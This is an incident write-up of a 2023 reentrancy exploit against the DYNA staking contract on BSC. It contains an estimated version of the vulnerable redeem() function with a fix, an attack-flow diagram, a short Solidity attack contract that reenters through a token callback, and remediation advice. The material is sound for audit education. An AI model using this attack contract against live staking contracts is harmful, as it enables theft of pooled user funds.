# DYNA — Staking Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-24 |
| **Protocol** | DYNA |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x06bbe093...](https://bscscan.com/tx/0x06bbe093d9b84783b8ca92abab5eb8590cb2321285660f9b2a529d665d3f18e4) |
| **Vulnerable Contract** | DYNA Staking Contract |
| **Root Cause** | External token transfer before state update in `redeem()` enables reentrancy |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/DYNA_exp.sol) |

---
## 1. Vulnerability Overview

The `redeem()` function of the DYNA staking contract does not follow the CEI (Checks-Effects-Interactions) pattern when returning staked tokens. The external token transfer occurs before the internal state (staking balance) is updated, allowing an attacker to reenter via a transfer callback and withdraw multiple times against the same staking balance.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable redeem function (CEI pattern violation)
interface IStakingDYNA {
    function deposit(uint256 _stakeAmount) external;
    function redeem(uint256 _redeemAmount) external;
}

// Estimated vulnerable implementation
function redeem(uint256 _redeemAmount) external {
    require(stakedBalance[msg.sender] >= _redeemAmount, "Insufficient stake");

    // ❌ Token transfer before state update
    IERC20(dynaToken).transfer(msg.sender, _redeemAmount);
    // At this point, if msg.sender reenters, stakedBalance has not yet been decremented

    stakedBalance[msg.sender] -= _redeemAmount;  // ❌ State update too late
}

// ✅ Fix: Apply CEI pattern
function redeem(uint256 _redeemAmount) external {
    require(stakedBalance[msg.sender] >= _redeemAmount, "Insufficient stake");

    // ✅ Update state first
    stakedBalance[msg.sender] -= _redeemAmount;

    // ✅ Then perform external transfer
    IERC20(dynaToken).transfer(msg.sender, _redeemAmount);
}
```

### On-chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: External token transfer before state update in `redeem()` enables reentrancy
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
  │
  ├─1─▶ deposit(amount) → set staking balance
  │
  ├─2─▶ call redeem(amount)
  │       │
  │       ├─ balance check: stakedBalance >= amount ✓
  │       ├─ transfer DYNA token → to attacker contract
  │       │   │
  │       │   └─3─▶ reenter via callback: call redeem(amount) again
  │       │           stakedBalance not yet decremented → passes check again
  │       │           receive additional tokens
  │       │
  │       └─ decrement stakedBalance (already withdrawn multiple times)
  │
  └─4─▶ swap acquired DYNA → WBNB → realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    IStakingDYNA staking;
    uint256 attackAmount;
    uint256 reentrancyCount;

    function attack() external {
        // 1. Initiate staking
        IERC20(dynaToken).approve(address(staking), attackAmount);
        staking.deposit(attackAmount);

        // 2. Begin reentrancy attack
        staking.redeem(attackAmount);
    }

    // DYNA token receive callback (ERC777 or custom callback)
    function onTokenReceived(address, uint256) external {
        if (reentrancyCount < 5) {  // 5 reentrant calls
            reentrancyCount++;
            staking.redeem(attackAmount);  // Reenter: withdraw again while balance not yet decremented
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Vector** | Callback abuse during staking withdrawal |
| **Impact Scope** | Entire staking pool |
| **DASP Classification** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |

## 6. Remediation Recommendations

1. **Enforce CEI Pattern**: In all withdrawal functions, update state before transferring tokens.
2. **Use ReentrancyGuard**: Block reentrancy with the `nonReentrant` modifier.
3. **Withdrawal Lock**: Restrict withdrawals to exactly once per transaction.

## 7. Lessons Learned

- Reentrancy attacks have been a known pattern since 2016, yet continue to recur in new protocols.
- Both BlockSec and BeosinAlert monitored this incident in real time.
- Staking withdrawal functions are prime targets for reentrancy attacks and must be prioritized during audits.